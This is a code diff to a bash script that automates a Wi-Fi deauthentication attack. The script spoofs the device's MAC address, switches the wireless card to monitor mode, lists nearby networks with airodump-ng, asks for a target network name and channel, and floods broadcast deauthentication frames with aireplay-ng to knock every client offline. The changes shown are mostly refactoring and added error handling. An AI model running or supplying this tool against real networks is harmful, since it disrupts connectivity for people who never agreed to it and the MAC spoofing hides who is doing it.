@@ -14,7 +14,7 @@ interface=$(iw dev | awk '$1=="Interface"{print $2}')
 
 # Colors functions
 error_m () {
-  echo -e "[${red_color}*${end_color}] $1"
+  echo -e "\n[${red_color}*${end_color}] $1"
   exit 0
 }
 
@@ -30,34 +30,44 @@ ready_m () {
   echo -e "\n[${green_color}*${end_color}] $1"
 }
 
-message_color (){
+print_title_message (){
  echo -en "[${purple_color}*${end_color}] ${turquoise_color}$1${end_color}" 
 }
 
 # Exit Manage
 trap ctrl_c INT
 ctrl_c () {
-  kill -9 "$airodump_ng_xterm_PID" 1>&2 2>/dev/null
-  kill -9 "$aireplay_ng_xterm_PID" 1>&2 2>/dev/null
+  kill -9 "$airodump_ng_xterm_PID" 2>/dev/null & 
+  kill -9 "$aireplay_ng_xterm_PID" 2>/dev/null &
   resetInterface
 	exit 0
 }
 
 isMonitorMode() {
   iw dev | grep monitor >/dev/null
-  if [[ "$(echo $?)" -ne 0 ]]; then
+  if [[ "$?" -ne 0 ]]; then
     return 1
   fi
 }
 
 resetInterface () {
-  message_color "Resseting Network\n\n"
+  echo -e "\n"
+  print_title_message "Resseting Network\n\n"
 
   working_m "Setting Managed Interface"
   ip link set $interface down && iw $interface set type managed
+  if [[ "$?" -ne 0 ]]; then
+    error_m "Failed to set managed interface"
+  fi
 
   working_m "Restarting Network Services"
-  systemctl restart wpa_supplicant.service NetworkManager.service dhcpcd.service
+  network_services=(wpa_supplicant.service NetworkManager.service dhcpcd.service)
+  for service in "${network_services[@]}"; do
+    systemctl restart $service 2>/dev/null
+    if [[ "$?" -ne 0 ]]; then
+      warning_m "Failed to restart $service\n"
+    fi    
+  done
 
   working_m "Set default MAC\n"
   macchanger -p $interface 
@@ -68,16 +78,16 @@ resetInterface () {
 
 startAttack () {
   # Show networks
-  xterm -bg black -hold -geometry 180x60 -e "airodump-ng  --wps --manufacturer $interface" 1>&2 2>/dev/null &
+  xterm -bg black -hold -geometry 180x60 -e "airodump-ng --wps --manufacturer $interface" 1>&2 2>/dev/null &
   airodump_ng_xterm_PID=$!
   
   # Target
-  message_color "ESSID: "
+  print_title_message "ESSID: "
   read -r essid
-  message_color "Chanel: "
+  print_title_message "Chanel: "
   read -r channel
 
-  xterm -fg red -bg black -hold -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$essid' $interface && \
+  xterm -fg red -bg black -hold -geometry 90x32 -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF -e '$essid' $interface && \
     echo -e '\n[${green_color}*${end_color}] Done!'" &
   aireplay_ng_xterm_PID=$!
 
@@ -87,19 +97,22 @@ startAttack () {
 }
 
 setMonitorMode () {
+  print_title_message "Setting Monitor Mode...\n"
   # Mac Address
   ifconfig "$interface" down && macchanger -a "$interface" >/dev/null
   ifconfig "$interface" up
 
   iw dev | grep monitor >/dev/null
-  if [[ "$(echo $?)" -ne 0 ]]; then
-    message_color "Setting up environment...\n"
+  if [[ "$?" -ne 0 ]]; then
+    print_title_message "Setting up environment...\n"
     # Monitor Mode
-    airmon-ng check kill >/dev/null
+    if ! airmon-ng check kill >/dev/null; then
+      error_m "Failed to kill conflicting processes"
+    fi
     airmon-ng start "$interface" >/dev/null
 
     iw dev | grep monitor >/dev/null
-    if [[ "$(echo $?)" -ne 0 ]]; then
+    if [[ "$?" -ne 0 ]]; then
       error_m "Can't set Monitor Mode"
     fi
 
@@ -108,6 +121,7 @@ setMonitorMode () {
   # Show new configurations
   echo -e "${yellow_color}"
   iw dev
+  echo
   macchanger -s "$interface"
   echo -e "${end_color}"
   sleep 2
@@ -117,10 +131,9 @@ checkDependencies () {
   clear
   dependencies=(aircrack-ng macchanger xterm)
 
-  message_color "Checking dependencies...\n"
+  print_title_message "Checking dependencies...\n"
 
   for program in "${dependencies[@]}"; do
-
     if [ -x "$(command -v $program)" ]; then
       ready_m "$program"
     else
